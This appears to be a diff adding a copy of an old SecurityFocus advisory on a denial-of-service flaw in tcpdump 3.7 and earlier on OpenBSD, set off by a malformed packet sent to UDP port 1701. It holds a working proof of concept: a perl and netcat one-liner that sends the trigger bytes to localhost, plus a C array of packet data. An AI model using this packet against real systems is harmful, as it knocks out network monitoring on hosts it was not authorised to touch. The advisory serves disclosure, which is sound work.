@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/9263/info
+
+A vulnerability has been reported to exist in the software that may allow a remote attacker to cause a denial of service condition in tcpdump. The issue presents itself when an attacker sends a maliciously formatted packet containing 0xff,0x02 bytes to UDP port 1701 of a system running a vulnerable version of tcpdump.
+
+This issue is reported to affect tcpdump 3.7 and prior running on OpenBSD 3.3 and -current, however other versions on different platforms could be affected as well. 
+
+tcpdump -i lo0 -n udp and dst port 1701 &
+perl -e 'print "\xff\x02"' | nc -u localhost 1701
+
+Example packet data has been provided by Balaram Amgoth <ramgoth@yahoo.com>:
+char packet[] = "\x82\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
